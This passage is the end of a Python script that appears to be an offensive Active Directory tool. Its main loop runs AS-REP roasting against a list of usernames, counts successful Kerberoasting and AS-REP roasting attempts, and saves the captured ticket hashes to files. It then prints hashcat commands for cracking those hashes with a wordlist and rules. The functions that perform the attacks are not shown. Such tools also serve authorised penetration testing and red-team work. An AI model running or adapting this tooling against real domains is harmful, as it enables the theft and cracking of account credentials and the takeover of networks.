            print(f"{CYAN}[*] Starting ASREPRoasting...{RESET}")
            print(f"{CYAN}[*] Targets: {len(usernames)}{RESET}\n")
            
            for username in usernames:
                result = asreproast_user(username, args.domain, args.dc, args)
                results.append(result)
                
                if result['status'] == 'success':
                    print(f"{GREEN}[+]{RESET} {username} - Hash obtained")
                elif args.verbose:
                    print(f"{RED}[!]{RESET} {username} - Failed")
    
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
    
    # Print summary
    print(f"\n{CYAN}{'=' * 80}{RESET}")
    print(f"{CYAN}Attack Complete{RESET}")
    print(f"{CYAN}{'=' * 80}{RESET}")
    
    kerb_success = len([r for r in results if r['attack_type'] == 'kerberoast' and r['status'] == 'success'])
    asrep_success = len([r for r in results if r['attack_type'] == 'asreproast' and r['status'] == 'success'])
    
    print(f"Kerberoasting successes: {kerb_success}")
    print(f"ASREPRoasting successes: {asrep_success}")
    
    # Save results
    if results:
        success_results = [r for r in results if r['status'] == 'success']
        if success_results:
            save_kerblist(success_results)
            
            if kerb_success > 0:
                save_tgs_hashes(success_results)
            
            if asrep_success > 0:
                save_asrep_hashes(success_results)
            
            save_details(success_results)
            save_json(success_results)
            save_kerberos_attack_guide(success_results)
            
            print(f"\n{YELLOW}[*] Next steps:{RESET}")
            if kerb_success > 0:
                print(f"  hashcat -m 13100 tgs_hashes.txt rockyou.txt -r /path/to/best64.rule")
                print(f"  {CYAN}Review KERBEROS_ATTACK_GUIDE.txt for comprehensive cracking strategies{RESET}")
            if asrep_success > 0:
                print(f"  hashcat -m 18200 asrep_hashes.txt rockyou.txt -r /path/to/best64.rule")
                print(f"  {CYAN}Review KERBEROS_ATTACK_GUIDE.txt for comprehensive cracking strategies{RESET}")
    
    print(f"\n{GREEN}[+] Attack complete!{RESET}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
        sys.exit(0)
